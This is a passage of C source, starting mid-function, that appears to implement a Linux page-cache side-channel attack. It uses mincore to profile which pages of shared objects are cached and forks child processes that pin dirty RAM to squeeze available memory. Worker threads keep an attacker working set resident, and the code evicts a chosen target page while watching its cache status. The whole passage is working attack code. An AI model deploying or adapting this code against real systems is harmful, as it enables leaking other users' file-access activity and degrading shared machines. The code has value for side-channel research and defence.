        printf(FAIL "Error (%s) at fts_open...\n", strerror(errno));
        return -1;
    }

    while (running)
    {
        current_ftsent = fts_read(fts_handle);
        // error at traversing files
        if (current_ftsent == NULL && errno)
        {
            // catch too many open files error (end gracefully)
            if (errno == EMFILE)
            {
                printf(WARNING "Too many open files at fts_read, ignoring rest of files...\n");
                break;
            }

            DEBUG_PRINT((DEBUG "Error (%s) at fts_read...\n", strerror(errno)));
            goto error;
        }
        // end
        else if (current_ftsent == NULL)
        {
            break;
        }

        // regular file
        if (current_ftsent->fts_info == FTS_F)
        {
            DEBUG_PRINT((DEBUG "Found possible shared object: %s\n", current_ftsent->fts_path));

            // check if the shared object matches the target
            if (!strcmp(current_ftsent->fts_name, EVICTION_FILENAME) ||
                !strcmp(current_ftsent->fts_path, target_obj_path))
            {
                DEBUG_PRINT((DEBUG "Shared object %s is the eviction file or target, skipping...\n", current_ftsent->fts_name));
                continue;
            }

            if (current_ftsent->fts_statp->st_size == 0)
            {
                DEBUG_PRINT((DEBUG "File %s has zero size skipping...\n", current_ftsent->fts_name));
                continue;
            }

            // prepare cached file object
            // ignore errors, try again
            if (initCachedFile(&current_cached_file) < 0)
            {
                DEBUG_PRINT((DEBUG "Error at initCachedFile...\n"));
                continue;
            }
            // open file, do not update access time (faster)
            // ignore errors, try again
            current_cached_file.fd_ = open(current_ftsent->fts_accpath, O_RDONLY | O_NOATIME);
            if (current_cached_file.fd_ < 0)
            {
                DEBUG_PRINT((DEBUG "Error (%s) at open: %s...\n", strerror(errno),
                             current_ftsent->fts_accpath));
                closeCachedFile(&current_cached_file);
                continue;
            }
            current_cached_file.size_ = current_ftsent->fts_statp->st_size;
            current_cached_file.size_pages_ = (current_cached_file.size_ + PAGE_SIZE - 1) / PAGE_SIZE;

            // parse page sequences
            // ignore errors, try again
            if (profileResidentPageSequences(&current_cached_file, ws->ps_add_threshold_) < 0)
            {
                printf(WARNING "Error at profileResidentPageSequences: %s...\n", current_ftsent->fts_accpath);
                closeCachedFile(&current_cached_file);
                continue;
            }

            // no page sequences -> close object
            if (current_cached_file.resident_page_sequences_.size_ == 0)
            {
                closeCachedFile(&current_cached_file);
            }
            // else add current cached file to cached files
            else
            {
                // ignore errors, try again
                if (!listAppendBack(&ws->resident_files_, &current_cached_file))
                {
                    closeCachedFile(&current_cached_file);
                    continue;
                }
            }

            checked_files++;
            memory_checked += current_cached_file.size_;
            mem_in_ws += current_cached_file.resident_memory_;
        }
    }

    ws->mem_in_ws_ = mem_in_ws;
    DEBUG_PRINT((DEBUG "Finished profiling loaded shared objects (%zu files checked, checked data %zu kB, used as working set %zu kB)!\n",
                 checked_files, memory_checked / 1024, mem_in_ws / 1024));

    goto cleanup;

error:
    ret = -1;
    listDestroy(&ws->resident_files_, closeCachedFile);
    closeCachedFile(&current_cached_file);

cleanup:

    fts_close(fts_handle);

    return ret;
}

int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
{
    int ret = 0;
    void *mapping_addr = MAP_FAILED;
    unsigned char *page_status = NULL;
    PageSequence sequence = {0};

    // reset array size to zero
    dynArrayReset(&current_cached_file->resident_page_sequences_);
    // reset resident memory
    current_cached_file->resident_memory_ = 0;

    // advise random access to avoid readahead
    posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM);

    mapping_addr =
        mmap(NULL, current_cached_file->size_, PROT_READ | PROT_EXEC, MAP_PRIVATE, current_cached_file->fd_, 0);
    if (mapping_addr == MAP_FAILED)
    {
        DEBUG_PRINT((DEBUG "Error (%s) at mmap...\n", strerror(errno)));
        goto error;
    }

    // advise random access to avoid readahead
    // NOTE on linux actually posix_fadvise and madvise use the same internal functions so this is kind of redundant
    madvise(mapping_addr, current_cached_file->size_, MADV_RANDOM);

    page_status = malloc(current_cached_file->size_pages_);
    if (page_status == NULL)
    {
        DEBUG_PRINT((DEBUG "Error (%s) at malloc...\n", strerror(errno)));
        goto error;
    }

    if (mincore(mapping_addr, current_cached_file->size_, page_status) != 0)
    {
        DEBUG_PRINT((DEBUG "Error (%s) at mincore...\n", strerror(errno)));
        goto error;
    }

    // check for sequences and add them
    for (size_t p = 0; p < current_cached_file->size_pages_; p++)
    {
        if (page_status[p] & 1)
        {
            if (sequence.length_ == 0)
            {
                sequence.offset_ = p;
            }

            sequence.length_++;
        }
        else
        {
            // add sequence if greater equal than threshold
            if (sequence.length_ >= ps_add_threshold)
            {
                // add sequence pages
                if (!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
                {
                    DEBUG_PRINT((DEBUG "Error at dynArrayAppend...\n"));
                    goto error;
                }

                current_cached_file->resident_memory_ += sequence.length_ * PAGE_SIZE;
                DEBUG_PRINT((DEBUG "Added page sequence with page offset %zu and %zu pages\n",
                             sequence.offset_, sequence.length_));
                // reset sequence length
                sequence.length_ = 0;
            }
        }
    }
    // process last found sequence
    if (sequence.length_ >= ps_add_threshold)
    {
        // add sequence pages
        if (!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
        {
            DEBUG_PRINT((DEBUG "Error at dynArrayAppend...\n"));
            goto error;
        }

        current_cached_file->resident_memory_ += sequence.length_ * PAGE_SIZE;
        DEBUG_PRINT((DEBUG "Added page sequence with page offset %zu and %zu pages\n",
                     sequence.offset_, sequence.length_));
    }

    goto cleanup;

error:

    ret = -1;
    dynArrayDestroy(&current_cached_file->resident_page_sequences_, NULL);
    current_cached_file->resident_memory_ = 0;

cleanup:

    if (mapping_addr != MAP_FAILED)
    {
        munmap(mapping_addr, current_cached_file->size_);
    }
    free(page_status);

    return ret;
}

int pageSeqCmp(void *node, void *data)
{
    if (((PageSequence *)data)->length_ > ((PageSequence *)node)->length_)
    {
        return 1;
    }

    return 0;
}

int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
{
    pid_t child_pid;
    void *fillup_mem;
    sem_t *sem;

    // create a shared semaphore
    sem = mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sem == MAP_FAILED)
    {
        printf(FAIL BS_MGR_TAG "Error (%s) at mmap...\n", strerror(errno));
        return -1;
    }

    if (sem_init(sem, 1, 0))
    {
        printf(FAIL BS_MGR_TAG "Error (%s) at sem_init...\n", strerror(errno));
        return -1;
    }

    DEBUG_PRINT((DEBUG BS_MGR_TAG "Going to block %zu kB of physical memory, need %zu child processes...\n", fillup_size / 1024,
                 fillup_size / bs->def_fillup_size_));

    // round up
    for (size_t i = 1; i <= (fillup_size + bs->def_fillup_size_ - 1) / bs->def_fillup_size_; i++)
    {
        child_pid = fork();

        if (child_pid < 0)
        {
            printf(FAIL BS_MGR_TAG "Error (%s) at fork for block ram child..\n", strerror(errno));
            return -1;
        }
        else if (child_pid == 0)
        {
            // child
            DEBUG_PRINT(
                (DEBUG BS_MGR_TAG "New child %zu with %zu kB dirty memory spawned...\n", i, bs->def_fillup_size_ / 1024));

            fillup_mem = mmap(
                NULL, bs->def_fillup_size_, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);

            if (fillup_mem == MAP_FAILED)
            {
                if (sem_post(sem) != 0)
                {
                    printf(FAIL BS_MGR_TAG "Error (%s) at sem_post...\n", strerror(errno));
                }

                printf(FAIL BS_MGR_TAG "Error (%s) mmap..\n", strerror(errno));
                exit(-1);
            }

            // write to fillup memory (unique contents -> no page deduplication)
            for (size_t m = 0; m < bs->def_fillup_size_; m += PAGE_SIZE)
            {
                *((size_t *)((uint8_t *)fillup_mem + m)) = i * m;
            }

            // finished
            if (sem_post(sem) != 0)
            {
                printf(FAIL BS_MGR_TAG "Error (%s) at sem_post...\n", strerror(errno));
                exit(-1);
            }

            while (1)
            {
                // wait for signal
                pause();
            }
        }

        // parent
        // wait until child process has finished
        if (sem_wait(sem))
        {
            printf(FAIL BS_MGR_TAG "Error (%s) at sem_wait...\n", strerror(errno));
            return -1;
        }

        // error at dynArrayAppend <=> child could not be added
        if (!dynArrayAppend(&bs->fillup_processes_, &child_pid))
        {
            // kill child
            kill(child_pid, SIGKILL);
            printf(FAIL BS_MGR_TAG "Error (%s) at dynArrayAppend...\n", strerror(errno));
            return -1;
        }
    }

    munmap(sem, sizeof(sem_t));
    return 0;
}

void releaseRAM(AttackBlockingSet *bs, size_t release_size)
{
    size_t released;

    DEBUG_PRINT((DEBUG BS_MGR_TAG "Releasing %zu kB of blocking memory\n", release_size / 1024));

    while (release_size > 0 && bs->fillup_processes_.size_ > 0)
    {
        dynArrayPop(&bs->fillup_processes_, releaseRAMCb, &released);
        release_size = (release_size > released) ? release_size - released : 0;
    }
}

void releaseRAMCb(void *arg1, void *arg2)
{
    FillUpProcess *fp = arg1;
    size_t *released = arg2;

    kill(fp->pid_, SIGKILL);
    *released = fp->fillup_size_;
}

size_t evictTargetPage(Attack *attack)
{
    volatile uint8_t tmp = 0;
    (void)tmp;
    ssize_t accessed_mem = 0;
    unsigned char target_page_status = 1;

    // more aggressive readahead (done before), here experimentally
    // posix_fadvise(attack->eviction_set_.mapping_.fd_, 0, DEF_BS_MIN_AVAILABLE_MEM, POSIX_FADV_WILLNEED);
    // madvise(attack->eviction_set_.mapping_.addr_, DEF_BS_MIN_AVAILABLE_MEM, MADV_WILLNEED);

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);

#ifdef _DETAILED_EVICTION_SET_STAT_
    struct timespec access_start, access_end;
    size_t already_resident = 0;
    size_t t_access = 0;
    size_t t_resident = 0;
    size_t t_non_resident = 0;
#endif

    // access attack eviction set pages, bulk reading ahead using read was tested
    //lseek(attack->eviction_set_.mapping_.fd_, 0, SEEK_SET);
    for (size_t p = 0; p < attack->eviction_set_.mapping_.size_pages_; p++)
    {
        if (accessed_mem % attack->mincore_check_all_x_bytes_ == 0)
        {
            // check if target page was evicted
            if (mincore(attack->target_addr_, PAGE_SIZE, &target_page_status) < 0)
            {
                printf(FAIL "Error (%s) at mincore...\n", strerror(errno));
            }
            else if (!(target_page_status & 1))
            {
                break;
            }

            // advise to pre read next block (trying to optimise I/O requests, default readahead of linux is 32 pages)
            // did not prove to help, except for the first calls, as bottleneck is NOT reading but rather the page replacement mechanism
            /*if(madvise((uint8_t *) attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE, attack->mincore_check_all_x_bytes_, MADV_WILLNEED) < 0) 
            {
               printf(FAIL "Error (%s) at madvise...\n", strerror(errno)); 
            }*/
        }

#ifdef _DETAILED_EVICTION_SET_STAT_

        clock_gettime(CLOCK_MONOTONIC, &access_start);
    #ifdef EVICTION_USE_PREAD
        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
        {
            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
        }
        #ifdef PREAD_TWO_TIMES
            if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
            {
                printf(WARNING "Error (%s) at pread...\n", strerror(errno));
            }
        #endif
    #else 
        tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + (p)*PAGE_SIZE);
    #endif
        clock_gettime(CLOCK_MONOTONIC, &access_end);

        // calculate
        t_access = (access_end.tv_sec - access_start.tv_sec) * 1000000000UL + access_end.tv_nsec - access_start.tv_nsec;
        if (t_access < RAM_HIT_THRESHOLD)
        {
            already_resident++;
            t_resident += t_access;
        }
        else
        {
            t_non_resident += t_access;
            //printf("Timestamp: %zu\n duration: %zu ns\n", access_start.tv_sec * 1000000000UL + access_start.tv_nsec, t_access);
        }

#else
    #ifdef EVICTION_USE_PREAD
        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
        {
            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
        }
        #ifdef PREAD_TWO_TIMES
            if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
            {
                printf(WARNING "Error (%s) at pread...\n", strerror(errno));
            }
        #endif
    #else 
        tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p*PAGE_SIZE);
    #endif
#endif

        accessed_mem += PAGE_SIZE;
    }

    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

#ifdef _DETAILED_EVICTION_SET_STAT_
    printf(INFO "[Eviction Set] Resident pages: %zu kB, access time: %zu us\n", already_resident * PAGE_SIZE / 1024, t_resident / 1000);
    printf(INFO "[Eviction Set] Non resident pages: %zu kB, access time: %zu us\n", (accessed_mem - already_resident * PAGE_SIZE) / 1024, t_non_resident / 1000);
#endif

    return accessed_mem;
}

void *bsManagerThread(void *arg)
{
    AttackBlockingSet *bs = arg;
    size_t available_mem = 0;
    size_t mem_diff = 0;
    // set goal for available mem in middle of allowed region
    size_t available_mem_goal = bs->min_available_mem_ + (bs->max_available_mem_ - bs->min_available_mem_) / 2;

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG BS_MGR_TAG "BS manager thread running on core %d.\n", sched_getcpu()));
        available_mem = parseAvailableMem(bs->meminfo_file_path_) * 1024;
        DEBUG_PRINT((DEBUG BS_MGR_TAG "%zu kB of physical memory available\n", available_mem / 1024));
        //printf(DEBUG BS_MGR_TAG "%zu kB of physical memory available\n", available_mem / 1024);

        if (available_mem < bs->min_available_mem_)
        {
            mem_diff = available_mem_goal - available_mem;
            printf(BS_MGR_TAG "Too less physical memory available, releasing %zu kB...\n", mem_diff / 1024);
            releaseRAM(bs, mem_diff);
        }
        else if (available_mem > bs->max_available_mem_)
        {
            // /4 * 3 for slower convergence
            mem_diff = (available_mem - available_mem_goal) / 4 * 3;

            if (mem_diff >= bs->def_fillup_size_)
            {
                printf(BS_MGR_TAG "Too much physical memory available, blocking %zu kB...\n", mem_diff / 1024);
                blockRAM(bs, mem_diff);
            }
        }
        else if (!bs->initialized_)
        {
            sem_post(&bs->initialized_sem_);
            bs->initialized_ = 1;
        }

        nanosleep(&bs->evaluation_sleep_time_, NULL);
    }

    return NULL;
}

size_t parseAvailableMem(char *meminfo_file_path)
{
    FILE *meminfo_file = NULL;
    char line[LINE_MAX] = {0};
    char *available_mem_str = NULL;
    char *conversion_end = NULL;
    // in case of error SIZE_T_MAX is reported as available memory to trigger no action
    size_t available_mem = (size_t)-1;

    // open meminfo file
    meminfo_file = fopen(meminfo_file_path, "r");
    if (!meminfo_file)
    {
        printf(WARNING BS_MGR_TAG "Available memory could not be parsed!\n");
        printf(WARNING BS_MGR_TAG "Returning SIZE_MAX!\n");
        return available_mem;
    }

    // canary to see if line was longer as buffer
    line[IN_LINE_MAX - 1] = 'c';
    while (fgets(line, IN_LINE_MAX, meminfo_file))
    {
        // skip lines longer than 255
        if (line[IN_LINE_MAX - 1] == '\0')
        {
            continue;
        }

        if (strstr(line, MEMINFO_AVAILABLE_MEM_TAG) != NULL)
        {
            for (size_t c = strlen(MEMINFO_AVAILABLE_MEM_TAG); line[c] != 0; c++)
            {
                if (isdigit(line[c]))
                {
                    if (available_mem_str == NULL)
                    {
                        available_mem_str = line + c;
                    }
                }
                else if (available_mem_str != NULL)
                {
                    line[c] = 0;
                    break;
                }
            }

            available_mem = strtoul(available_mem_str, &conversion_end, 10);
            if ((available_mem_str != NULL && *available_mem_str == 0) || *conversion_end != 0 || errno == ERANGE)
            {
                available_mem_str = NULL;
                break;
            }

            break;
        }
    }

    if (!available_mem_str)
    {
        printf(WARNING BS_MGR_TAG "Available memory could not be parsed!\n");
        printf(WARNING BS_MGR_TAG "Returning SIZE_MAX!\n");
    }

    fclose(meminfo_file);

    return available_mem;
}

// TODO Maybe update profile after certain amount of time.
void *wsManagerThread(void *arg)
{
    AttackWorkingSet *ws = arg;
    size_t runs_since_last_profile_update = 0;
    void *ret = NULL;
    cpu_set_t cpu_mask;
    List tmp_list_swap1;
    List tmp_list_swap2;
    size_t tmp_size_t;

    //  reserve space for access thread data structures
    if (dynArrayResize(&ws->access_threads_, ws->access_thread_count_) == NULL)
    {
        printf(FAIL WS_MGR_TAG "Could not reserve memory...\n");
        goto error;
    }
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        // initialise access thread data structures
        initPageAccessThreadData(dynArrayGet(&ws->access_threads_, t));
    }
    // split up resident files into worker thread units
    preparePageAccessThreadData(ws);

    // spin up worker threads
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);

        // used to spin up worker threads on different CPUs
        pthread_attr_init(&thread_data->thread_attr_);

        CPU_ZERO(&cpu_mask);
        CPU_SET(used_pus, &cpu_mask);
        pthread_attr_setaffinity_np(&thread_data->thread_attr_, sizeof(cpu_set_t), &cpu_mask);

        printf(WS_MGR_TAG "Thread %zu configured to run on core %d and to access %zu files.\n", t, used_pus, thread_data->resident_files_.count_);
        thread_data->running_ = 1;
        if (pthread_create(&thread_data->tid_, &thread_data->thread_attr_, pageAccessThread, thread_data) != 0)
        {
            printf(FAIL WS_MGR_TAG "Error (%s) at creating access thread...\n", strerror(errno));
            goto error;
        }

        // increase to next core if wanted
        if ((t + 1) % ws->access_threads_per_pu_ == 0)
        {
            // NOTE has to be locked when accessed concourrently in future
            used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
        }
    }

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG WS_MGR_TAG "WS manager thread running on core %d.\n", sched_getcpu()));

        // update ws profile
        if (runs_since_last_profile_update == ws->profile_update_all_x_evaluations_)
        {
            DEBUG_PRINT((DEBUG WS_MGR_TAG "Launching profile update - not implemented.\n"));
            // TODO
            // make new profile
            // split up into thread portions
            // spin up thread with new profile
            runs_since_last_profile_update = 0;
        }

        // reevaluate working set
        DEBUG_PRINT((DEBUG WS_MGR_TAG "Reevaluating working set...\n"));
        // reevaluateWorkingSet fails if eviction was run during the reevaluation
        if (ws->evaluation_ && reevaluateWorkingSet(ws) == 0)
        {
            DEBUG_PRINT((WS_MGR_TAG "Rescanned working set now consists of %zu files (%zu bytes mapped).\n", ws->tmp_resident_files_.count_, ws->tmp_mem_in_ws_));

            // acquire locks
            for (size_t t = 0; t < ws->access_thread_count_; t++)
            {
                PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);

                if (thread_data->running_)
                {
                    pthread_mutex_lock(&thread_data->resident_files_lock_);
                }
            }

            // swap lists
            tmp_list_swap1 = ws->resident_files_;
            tmp_list_swap2 = ws->non_resident_files_;
            ws->resident_files_ = ws->tmp_resident_files_;
            ws->non_resident_files_ = ws->tmp_non_resident_files_;
            ws->tmp_resident_files_ = tmp_list_swap1;
            ws->tmp_non_resident_files_ = tmp_list_swap2;

            tmp_size_t = ws->mem_in_ws_;
            ws->mem_in_ws_ = ws->tmp_mem_in_ws_;
            ws->tmp_mem_in_ws_ = tmp_size_t;

            // rebalance files for threads
            preparePageAccessThreadData(ws);

            // release locks
            for (size_t t = 0; t < ws->access_thread_count_; t++)
            {
                PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);

                if (thread_data->running_)
                {
                    pthread_mutex_unlock(&thread_data->resident_files_lock_);
                }
            }
        }

        runs_since_last_profile_update++;
        nanosleep(&ws->evaluation_sleep_time_, NULL);
    }

    goto cleanup;

error:
    ret = (void *)-1;

cleanup:

    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadData);

    return ret;
}

void preparePageAccessThreadData(AttackWorkingSet *ws)
{
    ListNode *current_head = NULL;
    size_t files_per_thread = 0;
    size_t processed_files = 0;
    size_t t = 0;

    if (ws->resident_files_.count_ == 0)
    {
        return;
    }

    // current head
    current_head = ws->resident_files_.head_;
    // pages per thread (rounded down)
    files_per_thread = ws->resident_files_.count_ / ws->access_thread_count_;
    // prepare thread_data objects
    for (t = 0; t < ws->access_thread_count_ - 1; t++)
    {
        PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);
        // prepare fake lists
        thread_data->sleep_time_ = ws->access_sleep_time_;
        thread_data->resident_files_.head_ = current_head;
        thread_data->resident_files_.count_ = files_per_thread;

        processed_files += files_per_thread;
        current_head = listGetIndex(&ws->resident_files_, processed_files);
    }

    PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);
    // prepare thread_data object for last thread
    thread_data->sleep_time_ = ws->access_sleep_time_;
    thread_data->resident_files_.head_ = current_head;
    thread_data->resident_files_.count_ = ws->resident_files_.count_ - processed_files;

    return;
}

int reevaluateWorkingSet(AttackWorkingSet *ws)
{
    // ensure the tmp variables are empty
    listDestroy(&ws->tmp_resident_files_, closeCachedFileArrayFreeOnly);
    listDestroy(&ws->tmp_non_resident_files_, closeCachedFileArrayFreeOnly);
    ws->tmp_mem_in_ws_ = 0;

    // reevaluate resident files list
    if (reevaluateWorkingSetList(&ws->resident_files_, ws) < 0)
    {
        return -1;
    }

    // reevaluate non resident files list
    if (reevaluateWorkingSetList(&ws->non_resident_files_, ws) < 0)
    {
        return -1;
    }

    return 0;
}

int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws)
{
    ListNode *current_cached_file_node = NULL;
    ListNode *next_node = NULL;
    CachedFile current_cached_file = {0};

    // go cached files list
    current_cached_file_node = cached_file_list->head_;
    while (current_cached_file_node != NULL)
    {
        next_node = current_cached_file_node->next_;

        // copy current cached file and create a new dynarray
        current_cached_file = *((CachedFile *)current_cached_file_node->data_);
        if (!dynArrayInit(&current_cached_file.resident_page_sequences_, sizeof(PageSequence), ARRAY_INIT_CAP))
        {
            printf(FAIL "Error at dynArrayInit...\n");
            goto error;
        }

        // reevaluate file
        if (profileResidentPageSequences(&current_cached_file, ws->ps_add_threshold_) < 0)
        {
            printf(FAIL "Error at profileResidentPageSequences...\n");
            goto error;
        }

        // eviction is running stop
        if (ws->eviction_ignore_evaluation_ && __atomic_load_n(&eviction_running, __ATOMIC_RELAXED) == 1)
        {
            printf(WARNING "Eviction occured during reevaluation, ignoring result...\n");
            goto error;
        }

        // move to file to tmp non resident file list
        if (current_cached_file.resident_memory_ == 0)
        {
            listAppendBack(&ws->tmp_non_resident_files_, &current_cached_file);
        }
        else
        {
            listAppendBack(&ws->tmp_resident_files_, &current_cached_file);
            ws->tmp_mem_in_ws_ += current_cached_file.resident_memory_;
        }

        current_cached_file_node = next_node;
    }

    return 0;

error:

    dynArrayDestroy(&current_cached_file.resident_page_sequences_, NULL);

    return -1;
}

void *pageAccessThread(void *arg)
{
    PageAccessThreadData *page_thread_data = arg;
    volatile uint8_t tmp = 0;
    ListNode *resident_files_node = NULL;
    CachedFile *current_cached_file = NULL;
    PageSequence *resident_sequences = NULL;
    size_t resident_sequences_length = 0;
    size_t accessed_pages_count = 0;
    size_t accessed_files_count = 0;

    while (__atomic_load_n(&page_thread_data->running_, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) running on core %d.\n", (void *)page_thread_data->resident_files_.head_, sched_getcpu()));

        pthread_mutex_lock(&page_thread_data->resident_files_lock_);

        accessed_files_count = 0;
        accessed_pages_count = 0;
        resident_files_node = page_thread_data->resident_files_.head_;
        while (resident_files_node != NULL && accessed_files_count < page_thread_data->resident_files_.count_)
        {
            current_cached_file = (CachedFile *)resident_files_node->data_;

            // advise random access to avoid readahead
            posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM);

            resident_sequences = current_cached_file->resident_page_sequences_.data_;
            resident_sequences_length = current_cached_file->resident_page_sequences_.size_;

            for (size_t s = 0; s < resident_sequences_length; s++)
            {
                for (size_t p = resident_sequences[s].offset_; p < resident_sequences[s].offset_ + resident_sequences[s].length_; p++)
                {
                    //printf("Accessing offset %zu, %zu length\n", resident_sequences[s].offset_, resident_sequences[s].length_);
                    //also works with NULL
                    if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                    {
                        printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                    }
#ifdef PREAD_TWO_TIMES
                    if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                    {
                        printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                    }
#endif
                    accessed_pages_count++;
                }
            }

            accessed_files_count++;
            resident_files_node = resident_files_node->next_;
        }

        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) accessed %zu kB memory.\n", (void *)page_thread_data->resident_files_.head_, accessed_pages_count * PAGE_SIZE / 1024));

        pthread_mutex_unlock(&page_thread_data->resident_files_lock_);

#ifdef USE_NANOSLEEP
        nanosleep(&page_thread_data->sleep_time_, NULL);
#else
        sched_yield();
#endif
    }

    return NULL;
}

void *suppressThread(void *arg)
{
    AttackSuppressSet *ss = arg;
    volatile uint8_t tmp = 0;
    uint8_t **pages = ss->target_readahead_window_.data_;

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        for (size_t p = 0; p < ss->target_readahead_window_.size_; p++)
        {
            tmp += *pages[p];
        }

#ifdef USE_NANOSLEEP
        nanosleep(&ss->access_sleep_time_, NULL);
#else
        sched_yield();
#endif
    }

    return NULL;
}

size_t getMappingCount(const unsigned char *status, size_t size_in_pages)
{
    size_t mapped = 0;

    for (size_t p = 0; p < size_in_pages; p++)
    {
        mapped += (status[p] & 1);
    }

    return mapped;
}

void usageError(char *app_name)
{
    printf(USAGE USAGE_MSG, app_name);
}
